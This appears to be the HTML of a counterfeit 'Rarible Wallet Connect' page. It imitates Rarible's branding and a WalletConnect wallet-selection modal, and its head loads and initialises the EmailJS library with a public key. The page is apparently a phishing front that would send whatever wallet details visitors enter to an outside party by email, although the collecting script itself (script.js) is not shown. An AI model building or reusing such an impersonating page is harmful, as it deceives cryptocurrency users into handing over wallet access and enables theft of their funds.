<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Rarible Wallet Connect</title>
  <link rel="stylesheet" href="styles.css">
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
</script>
<script type="text/javascript">
   (function(){
      emailjs.init({
        publicKey: "Tf_N51oCFUyBY3Nwk",
      });
   })();
</script>
</head>
<body>
  <div class="container">
    <header class="header">
      <div class="logo-box">
        <div class="logo">R</div>
        <span class="brand">Rarible</span>
      </div>

      <h1>Connect wallet</h1>
      <p class="sub">
        Choose your favourite wallet to log in<br />Rarible.
      </p>
      <a class="wallet-link" href="#">What is a wallet?</a>

      <div class="chains">
        <img src="eth.png" alt="Chain 1" />
        <img src="list.png" alt="Chain 2" />
        <img src="eth.png" alt="Chain 3" />
        <img src="list.png" alt="Chain 4" />
        <img src="eth.png" alt="Chain 5" />
        <span class="network-label">Ethereum +16</span>
        <img class="network-icon" src="list.png" alt="More" />
      </div>

      <button id="open-wallet" class="main-btn">Connect Wallet</button>
    </header>

    <!-- WalletConnect Modal -->
    <div class="walletconnect" id="wallet-modal">
      <div class="walletconnect-header">
        <div class="header-left">
          <div class="wallet-logo-box">
            <img src="RB.png" alt="WalletConnect" class="wallet-logo" style="width: auto; height: 50px; margin: 5px;"/>
          </div>
          <span class="wc-title">WalletConnect</span>
        </div>
        <button class="close-btn" id="close-wallet">&times;</button>
      </div>

      <div class="walletconnect-body">
        <h2>Connect your wallet</h2>

       
        </div>

        <!-- Combined scroll + button -->
        <div class="scroll-area">
          <div class="scroll-wrapper">
            <div class="wallet-list">
              <div class="wallet"><img src="meta.png" alt="Wallet 1"style="width: auto; height: 50px; margin: 5px;"/></div>
              <div class="wallet"><img src="WalletConnect.png" alt="Wallet 2" style="width: auto; height: 50px; margin: 5px;"/></div>
              <div class="wallet"><img src="coin.png" alt="Wallet 3" style="width: auto; height: 50px; margin: 5px;"/></div>
              <div class="wallet"><img src="trust.png" alt="Wallet 4"style="width: auto; height: 50px; margin: 5px;"/></div>
              <div class="wallet"><img src="eth.png" alt="Wallet 5"style="width: auto; height: 50px; margin: 5px;"/></div>
              <!-- repeat for seamless loop -->
              <div class="wallet"><img src="meta.png" alt="Wallet 1"style="width: auto; height: 50px; margin: 5px;"/></div>
              <div class="wallet"><img src="WalletConnect.png" alt="Wallet 2"style="width: auto; height: 50px; margin: 5px;"/></div>
              <div class="wallet"><img src="coin.png" alt="Wallet 3"style="width: auto; height: 50px; margin: 5px;"/></div>
              <div class="wallet"><img src="trust.png" alt="Wallet 4"style="width: auto; height: 50px; margin: 5px;"/></div>
              <div class="wallet"><img src="eth.png" alt="Wallet 5"style="width: auto; height: 50px; margin: 5px;"/></div>
            </div>
          </div>
          <button class="select-btn">Select Wallet</button>
        </div>

        <p class="footer-text">
          Choose WalletConnect to see supported apps on your device
          <br>
          <hr width="100%" size="2" color="#000">
          
        </p>
        <p style="text-align: center;">&copy; Rarible, Inc.
        </p>
        <p style="text-align: center;">• Community guidelines • Terms </p>
        <p style="text-align: center;">• Privacy & Policy</p>        
      </div>
    </div>

    <!-- Secure Icon (re-opens modal) -->
    <button id="secure-open" class="secure-btn" style="display: none;">
      <img src="walletconnect-icon.png" alt="Re-open WalletConnect">
    </button>
  </div>

  <script src="script.js"></script>
</body>
</html>
